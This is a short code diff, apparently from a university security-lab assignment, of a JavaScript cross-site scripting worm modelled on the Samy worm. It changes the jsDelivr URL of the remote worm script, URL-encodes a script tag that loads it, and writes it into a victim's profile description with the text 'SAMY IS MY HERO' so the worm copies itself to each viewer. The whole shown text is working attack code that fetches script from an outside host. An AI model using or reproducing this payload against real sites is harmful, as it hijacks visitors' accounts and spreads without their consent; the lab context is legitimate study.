@@ -6,7 +6,7 @@ window.onload = function(){
 	// 	"src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/main/project03_task6_link3.js\">" +
 	// 	"</" + "script>");
 
-	var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@latest/project03_task6_link3.js\"></script>");
+	var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/project03_task6_link3.js\"></script>");
 	
 	// Set the content for the description field
 	var desc ="&description=SAMY IS MY HERO" + wormCode + "&accesslevel[description]=2";
